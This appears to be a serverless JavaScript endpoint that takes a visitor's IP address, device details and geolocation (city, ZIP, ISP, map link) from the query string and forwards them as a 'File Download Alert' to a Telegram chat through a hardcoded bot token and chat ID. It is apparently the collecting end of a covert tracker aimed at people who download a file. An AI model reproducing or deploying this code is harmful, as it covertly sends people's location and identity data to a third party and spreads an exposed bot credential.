export default async function handler(req, res) {
  const {
    ip = "UNKNOWN",
    os = "UNKNOWN",
    browser = "UNKNOWN",
    device = "UNKNOWN",
    city = "UNKNOWN",
    region = "UNKNOWN",
    country = "UNKNOWN",
    zip = "UNKNOWN",
    timezone = "UNKNOWN",
    isp = "UNKNOWN",
    org = "UNKNOWN",
    as = "UNKNOWN",
    maps = "",
    time = new Date().toISOString()
  } = req.query;

  const message = `
✈️ File Download Alert 🚨

🔹 IP: ${ip}
💻 OS: ${os}
🌐 Browser: ${browser}
📱 Device: ${device}
📍 Location: ${city}, ${region}, ${country}
🌍 Google Maps: [🔗 Open Map](${maps})
📮 ZIP: ${zip}
🕒 Timezone: ${timezone}
📡 ISP: ${isp}
🏢 Org: ${org}
🛰 AS: ${as}
🕓 Timestamp: ${time}
`;

  const botToken = "8172380019:AAHubU3XKILFTcTRC7qGGUCOUYeCkDMaAOs";
  const chatId = "-1002479732885";

  const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;

  try {
    const response = await fetch(url);
    const result = await response.json();
    res.status(200).json({ ok: true, telegram: result });
  } catch (error) {
    res.status(500).json({ ok: false, error: error.toString() });
  }
}
